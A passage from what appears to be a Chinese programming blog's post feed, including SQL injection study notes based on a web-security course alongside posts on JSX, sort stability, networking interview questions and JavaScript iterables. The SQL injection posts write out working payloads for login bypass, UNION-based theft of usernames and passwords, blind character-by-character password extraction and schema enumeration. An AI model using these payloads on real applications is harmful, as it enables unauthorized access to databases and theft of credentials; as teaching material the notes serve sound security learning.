class="SQL">...cookieid&#39;AND&#39;1&#39;=&#39;1拼接后的查询语句：SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#39;...cookieid&#39; AND &#39;1&#39;=&#39;1&#39;...cookieid&#39;AND&#39;1&#39;=&#39;2拼接后的查询语句：SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#39;...cookieid&#39; AND &#39;1&#39;=&#39;2&#39;</code></pre><p>第一个将导致查询返回结果，因为注入的 <code>AND &#39;1&#39;=&#39;1</code> 是 true, 因此将显示登陆成功的消息。</p><p>第二个导致查询不会返回任何值，因为注入的条件时 false</p><p>这两种操作可以让我们能够确定任何单一条件注入的答案，可以每次提取出一点数据。</p><p>举例来说，假设有一个称为 <code>Users</code> 的表，列是 <code>Username</code> 和 <code>Password</code> 有一个用户 Administrator</p><p>我们可以通过发送一系列输入逐渐地确定此用户的密码，以一次测试一个字符的密码。</p><pre><code class="SQL">abcd&#39;AND SUBSTRING((SELECT password FROM users where username=&#39;admin&#39;), 1, 1) &gt;&#39;m</code></pre><p>上述的 SUBSTREING 的意思是查询用户 admin 的密码，看其第一个 (从索引 1 开始截取一个字符) 字符是否大于字符 <code>m</code> </p><p>根据服务器返回的结果判断是否正确</p><p>然后，可以使用二分法判断到底是哪个字符</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 注入一</title>
      <link href="2021/09/20/sql-zhu-ru/"/>
      <url>2021/09/20/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>First Blood</p><a id="more"></a><h1 id="SQL-注入是什么？"><a href="#SQL-注入是什么？" class="headerlink" title="SQL 注入是什么？"></a>SQL 注入是什么？</h1><p>SQL 注入是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。它通常允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，从而持续更改应用程序的内容或行为。<br>在某些情况下，攻击者可能会升级 SQL 注入攻击，以损害基础服务器或其他后端基础架构，或执行拒绝服务攻击。</p><h1 id="注入实例"><a href="#注入实例" class="headerlink" title="注入实例"></a>注入实例</h1><p>在不同情况下会出现各种各样的 SQL 注射漏洞、攻击和技术。一些常见的 SQL 注射示例包括：</p><h2 id="检索隐藏数据"><a href="#检索隐藏数据" class="headerlink" title="检索隐藏数据"></a>检索隐藏数据</h2><p>考虑显示不同类别产品的购物应用程序。<br>当用户单击页面中分类栏的 “Gift” 类别时，他们的浏览器会请求类似这种 URL：</p><pre><code>https://insecure-website.com/products?category=Gifts</code></pre><p>后台查询语句为：</p><pre><code>SELECT * FROM products WHERE category = &#39;Gifts AND released = 1</code></pre><p>语句返回 products 表中符合 WHERE 条件的记录的的所有字段。released=1 表示尚未上架的。</p><p>如果后台没有进行防护，直接使用 URL 的参数 <code>Gift</code> 这个字符串去查询，就有注入风险。<br>注入类似：</p><pre><code>https://insecure-website.com/products?category=Gifts&#39;--</code></pre><p>这可能导致后台执行下面的查询语句：</p><pre><code>SELECT * FROM products WHERE　categoty = &#39;Gifts&#39;-- AND released = 1</code></pre><p>** 关键是两个折线 <code>--</code> 在 SQL 中表示注释的意思，这样注释后面的” 查询语句 “就会作废 **。这意味着所有产品都显示在显示中，包括未上架的产品。<br>更进一步，还可以显示所有分类的商品</p><pre><code>https://insecure-website.com/products?category=Gifts&#39;+OR+1=1--</code></pre><p>可能导致后台执行下面的查询语句：</p><pre><code>SELECT * FROM products WHERE category = &#39;Gifts&#39; OR 1=1--&#39; AND released = 1</code></pre><p>因为是 OR，每一个记录都会满足 <code>1=1</code>，所以，会返回所有记录！</p><blockquote><p>注意，后台将 URL 参数作为 SQL 查询条件时，有没有自带引号，上述注入是假设，带了单引号。</p></blockquote><h2 id="覆盖应用逻辑"><a href="#覆盖应用逻辑" class="headerlink" title="覆盖应用逻辑"></a>覆盖应用逻辑</h2><p>有一个登陆逻辑是：直接根据用户的输入的用户名，密码去查询，有记录返回则登陆成功，否则视为失败。</p><pre><code>SELECT * FROM users WHERE username = &#39;wiener&#39; AND password = &#39;bluecheese&#39;</code></pre><p>此时，可以利用注释，去覆盖这个用逻辑。用户名填 <code>administrator&#39;--</code>，密码随便输入。</p><pre><code>SELECT * FROM users WHERE username = &#39;administrator&#39;--&#39;AND password =&#39;&#39;</code></pre><p>这个语句会返回 admin 这个用户的记录，符合上面登陆成功的逻辑！</p><h2 id="获取其他表的数据-UNION"><a href="#获取其他表的数据-UNION" class="headerlink" title="获取其他表的数据 - UNION"></a>获取其他表的数据 - UNION</h2><p>** 如果 SQL 查询的结果在应用程序的响应中返回，攻击者可以利用 SQL 注入漏洞从数据库中的其他表中检索数据。**<br>这是使用 <code>UNION</code> 关键字完成的，该关键字允许您执行额外的 <code>Select</code> 查询并将结果附加到原始查询中。<br>例如，如果软件完全根据用户的输入，执行下面的查询：</p><pre><code>SELECT name, description FROM products WHERE category = &#39;Gifts&#39;</code></pre><p>可以将输入构造为：</p><pre><code>&#39; UNION SELECT username,password FROM users--</code></pre><p>返回</p><p>注意，UNION 查询需要满足：</p><ol><li>UNION 后选择的记录的列数要与前面选择的列数，前后一致，否则 SQL 查询本身会报错！</li><li>每个列中的数据类型必须在各个查询之间兼容。</li></ol><p>要执行 SQL UNION 攻击，您需要确保您的攻击满足这两个 ** 前提条件 **。<br>这通常涉及找出</p><ol><li>从原始正常查询返回了多少列？</li><li>从原始查询返回的哪些列属于合适的数据类型，用来保存注入查询后的结果？</li></ol><p>下面进行解答</p><h3 id="find-列数"><a href="#find-列数" class="headerlink" title="find 列数"></a>find 列数</h3><p>有两种有效方法来确定从原始查询返回的列数。</p><h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>第一种方法涉及注入一系列 <code>ORDER BY 索引</code> 子句并增加指定列索引，直到发生错误。</p><pre><code>&#39;ORDER BY 1--&#39; ORDER BY 2--&#39; ORDER BY 3--...</code></pre><p>此时，列数就是发生错误的 <code>ORDER BY</code> 的索引减一。</p><p>实际应用中，应用程序实际上可能在 HTTP 响应中的返回数据库错误，也可能返回通用错误，或者只是返回中没有任何结果。</p><p>只要能够检测到应用程序响应中的某些差异，则可以推断从查询返回的列数</p><h4 id="UNION-SELECT-NULL"><a href="#UNION-SELECT-NULL" class="headerlink" title="UNION SELECT NULL"></a>UNION SELECT NULL</h4><p>第二种方法，在 <code>UNION</code> 后 <code>SELECT</code> 一定数量的 <code>NULL</code></p><pre><code>&#39;UNION SELECT NULL--&#39; UNION SELECT NULL, NULL--&#39; UNION SELECT NULL, NULL, NULL--</code></pre><p>只有当 NULL 个数与前面的 SELECT 查询的列数一致，才会返回结果，否则 SQL 查询会报错。当查询的结果正确返回时，会多一条记录，每一列都是 NULL。<br>幸运的话，会在返回的结果中看出不同个数 NULL 的区别。</p><p>使用 NULL 获取列数需要注意：</p><ul><li>使用 <code>NULL</code> 作为从注入的 <code>SELECT</code> 查询返回的值的原因是，每个列中的数据类型必须在原始查询和注入查询之间兼容。由于 <code>NULL</code> 可转换为所有常用的数据类型，因此使用 <code>NULL</code> 可最大限度地提高列计数正确时有效载荷成功的可能性。</li><li>Oracle 数据库，每个 SQL 的 SELECT 都需要带着 FROM。Oracle 有一个内建的表 <code>dual</code>，所以针对 Oracle 数据库，使用 <code>&#39; UNION SELECT NULL FROM dual--</code></li><li>MySQL 数据库的注释后面可能需要再加一个空格</li></ul><p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL 注入 cheat sheet</a></p><h3 id="find-具有指定数据类型的列"><a href="#find-具有指定数据类型的列" class="headerlink" title="find 具有指定数据类型的列"></a>find 具有指定数据类型的列</h3><p>执行 SQL UNION 注入攻击的原因是能够从注注入攻击的查询中检索结果。<br>通常，要检索的有趣数据将以字符串形式显示，因此您需要在原始查询结果中找到一个或多个列，其数据类型是或与字符串数据兼容。</p><p>在确定所需列数后，您可以通过提交一系列带有 payload 的 UNION 查询来检测每个列是否可以保留字符串数据，将字符串值依次放入每个列中。<br>例如，如果查询返回四列，您将提交：</p><pre><code>&#39;UNION SELECT&#39;a&#39;,NULL,NULL,NULL--&#39; UNION SELECT NULL,&#39;a&#39;,NULL,NULL--&#39;UNION SELECT NULL,NULL,&#39;a&#39;,NULL--&#39; UNION SELECT NULL,NULL,NULL,&#39;a&#39;--</code></pre><p>如果未发生错误，并且应用程序的响应包含一些其他内容（包括注入的字符串值），则相关列适用于检索字符串数据。</p><blockquote><p>我在 MYSQL8 试了一下，就算类型不对也不会报错。。。</p></blockquote><h3 id="在单列中获取多个值"><a href="#在单列中获取多个值" class="headerlink" title="在单列中获取多个值"></a>在单列中获取多个值</h3><p>假设查询只返回一列，你想要的查询又需要两列，怎么办？<br>您可以通过将值串联在一起，轻松地在此单列中检索多个值，最好包括一个合适的分离器，以便您区分组合值。例如，在 Oracle 数据库上，您可以提交输入：</p><pre><code>&#39;UNION SELECT username ||&#39;~~&#39; || password FROM users--</code></pre><p>在 Oracle 数据库中，<code>||</code> 作用是连接字符串。此注入会连接 username 和 password 字段，以 <code>~~</code> 分开。</p><p>不同数据库的字符串连接方式不同。<br>MYSQL 是：</p><pre><code>&#39;UNION SELECT concat(username,&#39;~&#39;, password) from users--</code></pre><h3 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h3><ol><li>获取查询得到的具体列数（UNION SELECT NULL 或者 ORDER BY 123）</li><li>确定哪些列的数据类型是可利用的（UNION SELECT ‘a’,NULL,NULL,NULL）</li><li>联合查询，可利用的列数不足则进行字符串拼接。</li></ol><h2 id="直接检索数据库信息"><a href="#直接检索数据库信息" class="headerlink" title="直接检索数据库信息"></a>直接检索数据库信息</h2><p>在初步识别到存在 SQL 注入漏洞后，获取有关 ** 数据库本身 ** 的一些信息通常很有用。这些信息往往可以为进一步利用铺平道路。</p><p>您可以查询数据库的版本详细信息。这样做的方式取决于数据库类型，因此您可以从任何技术中推断出 ** 数据库类型 **。<br>对于 Oracle 数据库：</p><pre><code>SELECT * FROM v$version;</code></pre><p>您还可以确定存在哪些数据库表，以及它们包含哪些列。<br>例如，在大多数数据库中，您可以执行以下查询来列出表：</p><pre><code>SELECT * FROM information_schema.tables</code></pre><h3 id="查询数据库版本和类型"><a href="#查询数据库版本和类型" class="headerlink" title="查询数据库版本和类型"></a>查询数据库版本和类型</h3><p>在利用 SQL 注入漏洞时，通常需要收集有关数据库本身的一些信息。这包括数据库软件的类型和版本，以及数据库的内容，包括它包含的表格和列。</p><ul><li>MySQL: <code>select @@version</code></li><li>Oracle: <code>select * from v@version</code>，此表只有一行记录，包含 <code>banner</code> 等字段。</li></ul><h3 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h3><p>大多数数据库（** 甲骨文除外 **）都有一组称为 <code>information schema</code> 的视图，提供有关数据库的信息。<br>具体就是表 <code>information_schema.tables</code><br>查询到表后，可以查询表 <code>information_schema.columns</code> 来继续查询指定的表的列</p><p>至于 Oracle，使用 <code>SELECT * FROM all_tables</code> 获得所有表<br>再继续使用 <code>SELECT * FROM all_tab_columns WHERE table_name = &quot;USERS&quot;</code></p><p><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">课程源地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSX 的由来与语法</title>
      <link href="2021/09/17/jsx-yu-react/"/>
      <url>2021/09/17/jsx-yu-react/</url>
      
        <content type="html"><![CDATA[<p>为什么 React 需要 JSX</p><a id="more"></a><h1 id="JSX-由来"><a href="#JSX-由来" class="headerlink" title="JSX 由来"></a>JSX 由来</h1><h2 id="React-通过创建虚拟元素来管理整个虚拟-DOM"><a href="#React-通过创建虚拟元素来管理整个虚拟-DOM" class="headerlink" title="React 通过创建虚拟元素来管理整个虚拟 DOM"></a>React 通过创建虚拟元素来管理整个虚拟 DOM</h2><p>虚拟元素与真实元素是对应的，它的构建和更新在内存中完成（废，过程不会反映给真实 DOM。<br>React 的虚拟元素分为：1-DOM 类。2 - 组件类。这些元素与 JSX 密切联系。<br>在 JSX 代码中，组件的 tag 名是大写字母开头，而那些 DOM 标签的 tag 名则以小写字母开头。</p><h3 id="1-DOM-元素"><a href="#1-DOM-元素" class="headerlink" title="1 DOM 元素"></a>1 DOM 元素</h3><p>一个 Web 页面由 HTML 元素嵌套组合，使用 JS 怎么描述这个嵌套？<br>我们可以使用简单的 JSON 完成。<br>例如，一个按钮的 HTML 代码：</p><pre><code class="html">&lt;button class=&quot;btn btn-blue&quot;&gt;    &lt;em&gt;Confirm&lt;/em&gt;&lt;/button&gt;</code></pre><p>使用 JSON 表示这个按钮：</p><pre><code class="javascript">{    type: &#39;button&#39;,    props: {        className: &#39;btn btn-blue&#39;,        // 子元素可以是一个数组        children: [            {            type: &#39;em&#39;,            props: {                children: &#39;Confirm&#39;            }            },        ]    }}</code></pre><p>这样就可以在 JS 中创建虚拟 DOM 元素了。<br>这些对象表示的元素就可以指示 React 如何去显示真实的 DOM。</p><h3 id="2-组件元素"><a href="#2-组件元素" class="headerlink" title="2 组件元素"></a>2 组件元素</h3><p>既然可以用 JS 代码表示 DOM 元素了，那就可以进一步封装上面的” 虚拟 DOM“按钮。</p><pre><code class="javascript">const Button = ({ color, text }) =&gt; {    return {        type: &#39;button&#39;,        // 属性又是一个对象        props: {            className: `btn btn-${color}`,            // 按钮的子元素是一个字符串            children: {                type: &#39;em&#39;,                props: {                    children: text                }            }        }    }}</code></pre><p>我们可以很方便地调用 <code>Button({ color:&#39;red&#39;, text:&#39;ENG&#39; })</code> 生成一个按钮实例。<br>再想一想，其实还可以通过 ** 标签的方式 ** 创建一个按钮实例，标签名就是 Button，标签的元素属性就是参数，此时就具备了标签名，属性这两大条件，这样的方式构建的元素称为 <code>组件元素</code>。</p><p>这也是 React 的核心思想之一。因为有公共的表达方法，我们就可以让元素们彼此嵌套或混合。这些层层封装的组件元素，就是所谓的 React 组件，最终我们可以用递归渲染的方式构建出完全的 DOM 元素树。</p><p>可以以这个按钮最为原型，继承出更多按钮。<br>例如，封装一个表示危险操作的按钮：</p><pre><code class="javascript">const DangerButton = ({ text }) =&gt; (    {        type: Button,        props: {            // 红色的按钮            color: &#39;red&#39;,            children: text        }    })</code></pre><p>接着，我们可以很轻松地运用它，继续封装新的组件元素：</p><pre><code class="javascript">const DeleteAccount = () =&gt; {    type: &#39;div&#39;,    props: {        className: &#39;delete-account&#39;,        children: [            {                type: &#39;p&#39;,                props: {                    children: &#39;确定吗？&#39;                }            },            {                type: Deletebutton,                props: {                    children: &#39;确定&#39;                }            }        ]    }}</code></pre><p>这个 DeleteAccount 只有两个子元素，就显得比较冗余，当遇到更大的组件，就难以阅读了。<br>这让我们想起使用 HTML 书写结构时的畅快感受，JSX 语法为此应运而生。假如我们使用 JSX 语法来重新表达上述组件元素，只需这么写：</p><pre><code class="html">const DeleteAccount = () =&gt; {    &lt;div&gt;        &lt;p &gt; 确定吗？&lt;/p&gt;        &lt;DangerButton &gt; 确定 &lt;/DangerButton&gt;        &lt;/div&gt;}</code></pre><p>JSX 将 HTML 语法直接加入到 JavaScript 代码中，再通过翻译器（babel）转换到纯 JavaScript 后由浏览器执行。<br>JSX 的出现为我们省去了这个烦琐过程，使用 JSX 写法的代码更易于阅读与开发。</p><hr><h1 id="JSX-语法"><a href="#JSX-语法" class="headerlink" title="JSX 语法"></a>JSX 语法</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><ul><li>定义标签时，有且只能有一个标签包裹 JSX 结构。因为这些 JSX 要被使用 React.createElement 调用，最外层没有被包裹，显然无法转译成方法调用。</li><li>标签必须闭合</li></ul><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>HTML 存在的那些标签，在 JSX 里的属性不变，class 和 for 除外。</p><blockquote><p>由于 JSX 内可以写 JS 代码和 HTML 代码，但是 HTML 的 <code>for class</code> 和 JS 关键字冲突，所以将 HTML 代码的 <code>for class</code> 改为 <code>htmlFor className</code></p></blockquote><p>HTML 类标签的 <code>data-</code> 自定义属性也是有效的。</p><p>组件标签的属性是完全自定义的属性，也可以理解为实现组件所需要的参数。</p><h3 id="布尔属性"><a href="#布尔属性" class="headerlink" title="布尔属性"></a>布尔属性</h3><p>布尔属性如果缺值，则默认是 true<br>例如，<code>&lt;CheckBox checked={true} /&gt;</code> 可以简写属性为 <code>&lt;CheckBox checked/&gt;</code></p><h2 id="组件名的命名空间"><a href="#组件名的命名空间" class="headerlink" title="组件名的命名空间"></a>组件名的命名空间</h2><ul><li>JSX 可以使用命名空间，解决组件名称相同问题。<pre><code class="javascript">const App = () =&gt; (  &lt;MUI.PaisedButton label=&quot;Default&quot; /&gt;);</code></pre></li></ul><h2 id="JSX-内的注释"><a href="#JSX-内的注释" class="headerlink" title="JSX 内的注释"></a>JSX 内的注释</h2><p>虽然 JSX 里可以写 JS，但是与 JSX 注释与 JS 不同。<br>在标签外，可以在 <code>{ /**/ }</code> 内写那种多行注释，不能写单行注释。<br>在组件标签内，可以直接写多行注释</p><pre><code class="javascript">const App = (    &lt;Nav&gt;        {/* 节点注释 */}        &lt;Person            /* 多行            注释 */            name={window.isLoggedIn ? window.name : &#39;&#39;}        /&gt;    &lt;/Nav&gt;);</code></pre><h2 id="HTML-转义"><a href="#HTML-转义" class="headerlink" title="HTML 转义"></a>HTML 转义</h2><p>一些 HTML 实体字符无法被正确显示。例如 <code>&amp;copy;</code><br>有几种解决办法：</p><ul><li>直接使用 UTF-8 字符 ©；</li><li>使用对应字符的 Unicode 编码查询编码；</li><li>使用数组组装 <code>&lt;div&gt;{[&#39;cc&#39;, &lt;span&gt;&amp;copy;&lt;/span&gt;, &#39;2015&#39;]}&lt;/div&gt;；</code></li><li>直接插入原始的 HTML</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序稳定性有什么用</title>
      <link href="2021/09/05/pai-xu-wen-ding-xing-you-shi-me-yong/"/>
      <url>2021/09/05/pai-xu-wen-ding-xing-you-shi-me-yong/</url>
      
        <content type="html"><![CDATA[<p>稳定性还是有用的。</p><a id="more"></a><h1 id="什么是排序算法稳定性"><a href="#什么是排序算法稳定性" class="headerlink" title="什么是排序算法稳定性"></a>什么是排序算法稳定性</h1><p>两个相等元素的相对位置不变，在前的在排序后还是在前，后前的在排序后还是在后。</p><h1 id="稳定性有什么用"><a href="#稳定性有什么用" class="headerlink" title="稳定性有什么用"></a>稳定性有什么用</h1><p>直接举个例子：<br>有四个同学站一起，身高已经按照升序排列：</p><pre><code>zhang san 1.7zhang wu 1.8 li san 1.7li wu 1.8</code></pre><p>此时，你想将这四个同学再按照姓氏的拼音首字母安装升序排序，同时保持身高排序不变。<br>要达到的最终的排序结果应该是：</p><pre><code>li san 1.7li wu 1.8zhang san 1.7zhang wu 1.8</code></pre><p>如果使用非稳定排序算法，例如选择排序，进行排序的结果为：</p><pre><code>li san 1.7li wu 1.8zhang wu 1.8zhang san 1.7</code></pre><p>你会发现，<code>zhang san 1.7</code> 跑到了 <code>zhang wu 1.8</code> 后面去了。<br>而稳定排序就不会出现这种情况。</p><p>总得来说，这个稳定性排序的作用就是在当前排序规则下，不破坏之前的排序规则产生的对当前规则而言相同的元素的相对顺序。</p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>前端面试题汇总之计算机网络篇</title>
      <link href="2021/08/31/qian-duan-mian-shi-ti-hui-zong-zhi-ji-suan-ji-wang-luo-pian/"/>
      <url>2021/08/31/qian-duan-mian-shi-ti-hui-zong-zhi-ji-suan-ji-wang-luo-pian/</url>
      
        <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/6908327746473033741" target="_blank" rel="noopener">掘金文章</a></p><a id="more"></a><h1 id="1-GET-与-POST-区别"><a href="#1-GET-与-POST-区别" class="headerlink" title="1 GET 与 POST 区别"></a>1 GET 与 POST 区别</h1><ul><li>应用场景不同：GET 是幂等的（幂等的特点是任意次执行产生的影响与只执行一次的影响相同）。POST 不是幂等的。</li><li>是否缓存：浏览器一般自动缓存 GET 请求，很少对 POST 缓存</li><li>发送数据的方式：GET 请求的实体是空的，POST 请求实体就是要发送的数据</li><li>安全性：GET 请求可以将请求的参数放入 URL 地址发送，而 URL 会保存在浏览的历史记录中</li><li>参数类型：GET 会进行 URL 编码, GET 请求内参数只能出现 ASCII 字符，而 POST 支持更对的参数类型。</li></ul><h1 id="2-常见的-Content-Type"><a href="#2-常见的-Content-Type" class="headerlink" title="2 常见的 Content-Type"></a>2 常见的 Content-Type</h1><ul><li><code>text/html</code> 表示数据是 XML 格式文本数据</li><li><code>application/json</code> 表示数据是 json 数据</li><li><code>application/x-www-form-urlencoded</code> 是表单的默认提交方式。该种方式提交的数据放在 body 里面，数据按照 <code>key1=val1&amp;key2=val2</code> 的方式进行编码，<code>key</code> 和 <code>val</code> 都进行了 URL 转码。<ul><li>对于中文，有多种编码方式，UTF-8，gbk 等等。中文编码不同，最终的 URL 编码也不同。一般浏览器是 UTF-8 编码中文，再转 URL 编码。以 <code>我</code> 字为例，它的 utf-8 编码是 <code>E6 88 91</code>，再转换为 URL 编码是 <code>%E6%88%91</code></li></ul></li><li><code>multipart/form-data</code> 通常表单上传文件时使用该种方式</li></ul><h1 id="3-HTTP-状态码-304"><a href="#3-HTTP-状态码-304" class="headerlink" title="3 HTTP 状态码 304"></a>3 HTTP 状态码 304</h1><p>服务器为了提高网站访问速度，对之前访问的部分页面指定缓存机制，当客户端再次对这些页面进行请求，<br>服务器会根据缓存内容判断页面与之前是否相同，若相同便直接返回 304，此时客户端调用本地缓存内容，不必从服务器进对页面二次下载。</p><h1 id="4-GET-方法的-URL-长度受限的原因"><a href="#4-GET-方法的-URL-长度受限的原因" class="headerlink" title="4 GET 方法的 URL 长度受限的原因"></a>4 GET 方法的 URL 长度受限的原因</h1><p>实际上 HTTP 协议规范并没有对 get 方法请求的 url 长度进行限制，这个限制是特定的 <code>浏览器及服务器</code> 对它的限制。 IE 对 URL 长度的限制是 2083 字节 (2K+35)。由于 IE 浏览器对 URL 长度的允许值是最小的，所以开发过程中，只要 URL 不超过 <code>2083 字节</code>，那么在所有浏览器中工作都不会有问题。<br>nginx 默认是 8K 字节的请求头部大小</p><h1 id="5-当在浏览器中输入-URL-并且按下回车之后发生了什么"><a href="#5-当在浏览器中输入-URL-并且按下回车之后发生了什么" class="headerlink" title="5 当在浏览器中输入 URL 并且按下回车之后发生了什么"></a>5 当在浏览器中输入 URL 并且按下回车之后发生了什么</h1><ol><li>解析 URL。分析传输协议和请求的资源路径。如果协议或者主机名不符合规范，会作为关键字进行搜索引擎搜索。如果包含中文等字符，会进行 URL 编码（chrome 对中文是先 UTF-8 再 URL 编码），转义后再进行下一过程。</li><li>缓存判断。浏览器判断请求资源是否再缓存，并且是否有效，存在且有效直接使用，否则向服务器发送请求。</li><li>DNS 解析。目的是获取 URL 中的域名的 IP 地址。<ol><li>判断本地是否有域名的 IP 地址缓存，有则使用</li><li>本地无缓存，向本地 DNS 服务器发送请求，有缓存则使用</li><li>本地 DNS 服务器检查是否有缓存，如果没有就会先向根域名服务器发起请求，获得负责的顶级域名服务器的地址后，再向顶级域名服务器请求，然后获得负责的权威域名服务器的地址后，再向权威域名服务器发起请求，最终获得域名的 IP 地址后，本地 DNS 服务器再将这个 IP 地址返回给请求的用户。</li><li>用户向本地 DNS 服务器发起请求属于递归请求</li><li>本地 DNS 服务器向各级域名服务器发起请求属于迭代请求</li></ol></li><li>获取 MAC 地址。当浏览器得到 IP 地址后，数据传输还需要知道目的主机 MAC 地址<ol><li>因为应用层下发数据给传输层中的 TCP 协议，TCP 需要指定源端口号和目的端口号，</li><li>然后下发给网络层。网络层会将本机地址作为源地址，获取的 IP 地址作为目的地址。</li><li>然后将下发给数据链路层，数据链路层的发送需要加入通信双方的 MAC 地址，本机的 MAC 地址作为源 MAC 地址，目的 MAC 地址需要分情况处理。<ol><li>通过将 IP 地址与本机的子网掩码相与，可以判断是否与请求主机在同一个子网里，</li><li>如果在同一个子网里，可以使用 APR 协议获取到目的主机的 MAC 地址，</li><li>如果不在一个子网里，那么请求应该转发给网关，由它代为转发，此时可以通过 ARP 协议来获取网关的 MAC 地址，而前面需要的目的主机的 MAC 地址就是网关的地址。</li></ol></li></ol></li><li>TCP 三次握手。</li><li>HTTPS 握手</li><li>返回数据。当页面请求发送到服务器端后，服务器端会返回一个 html 文件作为响应，浏览器接收到响<br>应后，开始对 html 文件进行解析，开始页面的渲染过程</li><li>页面渲染。浏览器首先会根据 html 文件构建 DOM 树，根据解析到的 css 文件构建 CSSOM 树，如果遇到 script 标签，则判断是否含有 defer 或者 async 属性，要不然 script 的加载和执行会造成页面的渲染的阻塞。当 DOM 树和 CSSOM 树建立好后，根据它们来构建渲染树。渲染树构建好后，会根据渲染树来进行布局。布局完成后，最后使用浏览器的 UI 接口对页面进行绘制。这个时候整个页面就显示出来了</li><li>TCP 四次挥手</li></ol><h1 id="6-HTTP-明文的缺点"><a href="#6-HTTP-明文的缺点" class="headerlink" title="6 HTTP 明文的缺点"></a>6 HTTP 明文的缺点</h1><ul><li>窃听。明文内容会被窃听，账号信息容易泄漏，那你号没了。</li><li>冒充。无法验证通信双方身份，可能遇到伪装。访问假的淘宝、拼多多，那你钱没了。</li><li>篡改。无法保证报文完整性，可能遭到篡改。网页上植⼊垃圾广告，视觉污染，眼没了</li></ul><h1 id="7-HTTPS-如何解决上述问题？"><a href="#7-HTTPS-如何解决上述问题？" class="headerlink" title="7 HTTPS 如何解决上述问题？"></a>7 HTTPS 如何解决上述问题？</h1><p>HTTPS 在 HTTP 与 TCP 之间加入 SSL/TLS 协议。</p><ul><li>防窃听：非对称和对称加密算法保证了信息被窃取也不会导致通信原文被泄露。</li><li>防篡改：摘要算法实现完整性，为数据生成唯一的指纹。</li><li>防冒充：将服务器公钥放入 CA 办法的数字证书中。第三方权威机构保证公钥不被篡改和信任度。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可迭代对象 - 你不知道的 JS</title>
      <link href="2021/08/21/ke-die-dai-dui-xiang-ni-bu-zhi-dao-de-js/"/>
      <url>2021/08/21/ke-die-dai-dui-xiang-ni-bu-zhi-dao-de-js/</url>
      
        <content type="html"><![CDATA[<p>似曾相识</p><a id="more"></a><h2 id="Symbol-iterator"><a href="#Symbol-iterator" class="headerlink" title="Symbol.iterator"></a>Symbol.iterator</h2><p>一个 range 对象，它代表了一个数字区间:</p><pre><code>let range = {    from: 1,    to: 5,}</code></pre><p><code>for ... in</code> 可以遍历得到此对象属性 from,to<br><code>for ... of</code> 无法用在此对象上，因为不可迭代。<br>为了让 <code>range</code> 对象可迭代，我们需要为对象添加名为 <code>Symbol.iterator</code> 方法。此 symbol 乃专门用于使对象可迭代的 <code>内置 symbol</code></p><ul><li>此方法调用后，返回值时迭代器，它是一个对象，带有 <code>next</code> 方法</li><li><code>for ... of</code> 尝试搜寻此方法，拿到此迭代器对象。(存不存在原型继承？存在)</li><li>当 <code>for..of</code> 循环希望取得下一个数值，它就调用这个对象的 <code>next()</code> 方法</li><li>next 方法返回格式：<code>{done:Boolean, value:any}</code>。当 <code>done=true</code>，迭代结束。</li></ul><p>NOTE： 用了 ES6 的对象内方法的简写</p><pre><code>let range = {  from: 1,  to: 5,}// 是一个函数range[Symbol.iterator] = function（） {    // 函数返回迭代器对象  return {    current: this.from,    last: this.to,    next() {      if (this.current &lt;= this.last) {      // 返回｛done:...,value:...｝格式对象        return {          done: false,          value: this.current++        };      } else {        return {          done: true;  // 不需要有 value 了        }      }    }  }}</code></pre><p>现在 <code>for ... of</code> 可以运行了！<br>注意包含 next 方法的对象，里面直接用 this 并不能使用 range 的 this</p><pre><code>for (let num of range) {    alert(num); // 1, 然后是 2, 3, 4, 5}</code></pre><p>可以看出，迭代器对象和与其进行迭代的对象可以是分开的。<br><code>for ... of</code> 拿到的是 <code>range[Symbol.iterator]</code> 函数返回的对象，迭代的就是这个对象</p><p>但是调用迭代器时，通过 range 对象调用的，因为如果 <code>range[Symbol.iterator]</code> 是箭头函数，this 会丢失</p><p>可以把迭代器直接写到对象里面。</p><pre><code>// 写在里面的版本let range = {    from: 1,    to: 5,    [Symbol.iterator]: function () {        // 函数返回一个对象, 对象必须包含一个 next 函数        let cur = this.from;        let last = this.to;        // 这里的 this        return {            // 对象包含一个 next 方法, next 方法返回具有固定格式的对象            next: () =&gt; {                // this 就是 return 的对象 外层 的 this                // console.log(this.to);                if (cur &lt;= last) {                    return {                        done: false,                        value: cur++,                    }                } else {                    return {                        done: true,                    }                }            }        }    }}</code></pre><p>更进一步，把迭代器对象的 next 剥离出来，直接放到需要迭代的对象中</p><pre><code>// 剥离 next 函数let range = {    from: 1,    to: 5,    [Symbol.iterator]() {        this.cur = this.from;        return this;    },    next() {        {            if (this.cur &lt;= this.to) {                return {                    done: false,                    value: this.cur++,                }            } else {                return {                    done: true,                }            }        }    